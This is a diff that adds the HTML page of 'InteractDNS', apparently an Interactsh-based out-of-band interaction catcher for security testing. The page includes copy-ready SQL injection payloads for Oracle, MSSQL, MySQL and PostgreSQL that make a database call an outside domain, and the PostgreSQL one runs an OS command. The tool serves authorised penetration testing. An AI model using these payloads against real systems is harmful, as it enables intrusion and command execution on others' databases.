@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>InteractDNS - Burp Collaborator Alternative</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>InteractDNS</h1>
+            <p class="subtitle">A free Burp Collaborator alternative powered by Interactsh</p>
+        </header>
+        
+        <div class="domain-section">
+            <h2>Your Unique Interactsh Domain</h2>
+            <div class="domain-display">
+                <span id="interactshDomain">Generating domain...</span>
+                <button id="copyDomain" title="Copy domain to clipboard">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+                        <path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1h1a1 1 0 0 1 1 1V14a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1h1v-1z"/>
+                        <path d="M9.5 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3zm-3-1A1.5 1.5 0 0 0 5 1.5v1A1.5 1.5 0 0 0 6.5 4h3A1.5 1.5 0 0 0 11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3z"/>
+                    </svg>
+                </button>
+                <button id="refreshDomain" title="Generate new domain">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+                        <path fill-rule="evenodd" d="M8 3a5 5 0 1 0 4.546 2.914.5.5 0 0 1 .908-.417A6 6 0 1 1 8 2v1z"/>
+                        <path d="M8 4.466V.534a.25.25 0 0 1 .41-.192l2.36 1.966c.12.1.12.284 0 .384L8.41 4.658A.25.25 0 0 1 8 4.466z"/>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        
+        <div class="payload-examples">
+            <h2>SQL Injection Payload Examples</h2>
+            <div class="tabs">
+                <button class="tab-btn active" data-tab="oracle">Oracle</button>
+                <button class="tab-btn" data-tab="mssql">MSSQL</button>
+                <button class="tab-btn" data-tab="mysql">MySQL</button>
+                <button class="tab-btn" data-tab="postgresql">PostgreSQL</button>
+            </div>
+            <div class="tab-content">
+                <div id="oracle" class="tab-pane active">
+                    <pre><code id="oracle-payload">' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://DOMAIN/"> %remote;]>'),'/l') FROM dual--</code></pre>
+                    <button class="copy-btn" data-target="oracle-payload">Copy</button>
+                </div>
+                <div id="mssql" class="tab-pane">
+                    <pre><code id="mssql-payload">'; exec master..xp_dirtree '//DOMAIN/a'--</code></pre>
+                    <button class="copy-btn" data-target="mssql-payload">Copy</button>
+                </div>
+                <div id="mysql" class="tab-pane">
+                    <pre><code id="mysql-payload">' UNION SELECT LOAD_FILE('\\\\DOMAIN\\a')--</code></pre>
+                    <button class="copy-btn" data-target="mysql-payload">Copy</button>
+                </div>
+                <div id="postgresql" class="tab-pane">
+                    <pre><code id="postgresql-payload">'; copy (select '') to program 'nslookup DOMAIN'--</code></pre>
+                    <button class="copy-btn" data-target="postgresql-payload">Copy</button>
+                </div>
+            </div>
+        </div>
+        
+        <div class="interaction-section">
+            <div class="control-panel">
+                <h2>Interactions</h2>
+                <div class="buttons">
+                    <button id="clearLogs">Clear Logs</button>
+                    <button id="downloadLogs">Download Logs</button>
+                    <button id="pollingToggle">Stop Polling</button>
+                </div>
+            </div>
+            <div id="logs" class="logs-container"></div>
+        </div>
+        
+        <div class="info-section">
+            <h2>About InteractDNS</h2>
+            <p>
+                InteractDNS is a free alternative to Burp Collaborator that uses the powerful Interactsh service to detect out-of-band interactions.
+                It's perfect for testing SQL injections, SSRF, XXE, and other vulnerabilities that trigger DNS lookups.
+            </p>
+            <p>
+                All interactions are stored locally in your browser and never transmitted to any third-party services.
+                Interactsh domains are generated on-demand and are valid for a limited time.
+            </p>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+<footer class="footer">
+    <div class="footer-content">
+        <p class="copyright">© 2025 InteractDNS - A Free Burp Collaborator Alternative</p>
+        <p class="legal">This tool is intended for legitimate security testing only. Always obtain proper authorization.</p>
+        <p class="powered-by">Powered by <a href="https://github.com/projectdiscovery/interactsh" target="_blank">Interactsh</a></p>
+    </div>
+</footer>
+</html>
